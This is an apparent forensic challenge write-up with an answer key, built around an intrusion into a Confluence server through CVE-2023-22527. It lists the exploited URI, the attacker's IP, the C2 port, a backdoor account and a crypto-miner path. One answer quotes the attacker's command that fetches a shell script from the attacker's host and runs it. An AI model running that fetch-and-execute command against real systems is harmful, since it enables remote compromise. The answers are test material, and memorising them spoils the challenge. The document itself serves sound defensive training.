# Confluence CVE2023-22527

## Sherlock scenario

Confluence is used by many organizations. Our organization was recently targeted and we need your expertise to help us recover from this incident. Our defense tools raised an alert about a crypto miner tool in the Confluence related directory, which led sysadmins to believe that this incident was initiated from Confluence.

## Given artefacts

## Foundational knowledge

### What is Confluence?

Confluence is Atlassian's web-based collaboration and documentation platform. Organizations use it as an internal wiki for project documentation, meeting notes, procedures, and technical knowledge. Content is written on pages, grouped into spaces, and protected with user permissions. [Atlassian Confluence](https://www.atlassian.com/software/confluence)

Confluence is available as an Atlassian-hosted cloud service and as software deployed on an organization's own infrastructure. This investigation concerns a self-managed installation on Linux. Its HTTP access logs record requests to the application, while its application logs provide details such as errors and exceptions. Operating-system evidence can then establish what processes ran and which network connections existed.

### CVE-2023-22527

CVE-2023-22527 is a critical template injection vulnerability in Confluence Data Center and Server. An unauthenticated attacker can exploit an affected instance to achieve remote code execution (RCE). Atlassian assigned it a CVSS score of 10.0. [Atlassian security advisory](https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html)

A server-side template normally combines predefined presentation logic with data to generate a response. Template injection occurs when attacker-controlled input is interpreted as template instructions or expressions. In this case, exploitation can lead to commands executing on the server with the application process's privileges. Remote code execution does not inherently mean the attacker has root privileges.

The affected releases are Confluence Data Center and Server 8.0.x, 8.1.x, 8.2.x, 8.3.x, 8.4.x, and 8.5.0–8.5.3. Atlassian lists 8.5.4, 8.6.0, and 8.7.1 as fixed releases for this specific vulnerability. Confluence Cloud is unaffected. [Atlassian CVE FAQ](https://support.atlassian.com/atlassian-knowledge-base/kb/faq-for-cve-2023-22527/)

In this challenge, the suspicious requests target `/template/aui/text-inline.vm`. The `.vm` extension denotes a Velocity template. Correlating requests to this endpoint with application errors and process creation events helps reconstruct the transition from exploitation to command execution. A `python-requests` user agent suggests scripted requests, but a user agent alone does not prove exploitation.

## Questions

### 1. What is the URI path which is vulnerable to the CVE?



`Answer: /template/aui/text-inline.vm`

### 2. When did the attacker first exploit this vulnerability?



`Answer: 2024-01-25 11:41:26`

### 3. What is the attacker's remote IP Address?



`Answer: 3.110.176.89`

### 4. Analyze the Sysmon for Linux logs and identify the first command executed by the attacker.



`Answer: id`

### 5. What time did the attacker first enumerate directories on the compromised system?



`Answer: 2024-01-25 11:43:33`

### 6. The attacker tried to execute remote commands to get a more stable shell, but apparently failed many times. Analyzing the Confluence log sources, can you find the command they executed around 2024-01-25 11:50:50 that errored out?



`Answer: wget http://3.110.176.89/lin/6730789213.sh;chmod x 6730789213.sh; bash 6730789213.sh`

### 7. User agents are a useful source of information and can be used for analysis. What user agent was the attacker using?



`Answer: python-requests/2.28.2`

### 8. It appears that the attacker was able to download a bash script and then execute it to get a stable shell. What is the full path of this file? (Answer Format: /path/file.extension)



`Answer: /tmp/xxx.sh`

### 9. What is the size in bytes of the bash file detected earlier?



`Answer: 68855`

> **Answer discrepancy:** `68855` is the answer recorded in `questions.txt` and the walkthrough, but it is the file's inode number. The actual file size is **46 bytes**, confirmed by the collected file and the bodyfile entry. Bodyfile fields follow `MD5|name|inode|mode|UID|GID|size|atime|mtime|ctime|crtime`; the entry for `/tmp/xxx.sh` contains `68855` in the inode field and `46` in the size field.

### 10. Analyzing the network connections from the triage output, what is the C2 IP address and port that the attacker connected to? (Answer Format: IP:PORT)



`Answer: 3.110.176.89:1200`

### 11. What is the SHA1 hash of the bash script found in Question 8?



`Answer: 9ac4d3459093aac9ee4bb3b87fdeaaaa3c5bd551`

### 12. Attackers create new privileged user accounts for backdoor access. What is the username of the backdoor account created by the attacker?



`Answer: confluence_servcie`

### 13. When was this backdoor account created? (Answer Format: YYYY-MM-DD HH:MM:SS)



`Answer: 2024-01-25 12:15:42`

### 14. The attacker downloaded a miner tool before being detected. What is the full path of this miner archive file?



`Answer: /opt/confluence/xmrig-6.16.4-linux-static-x64.tar.gz`
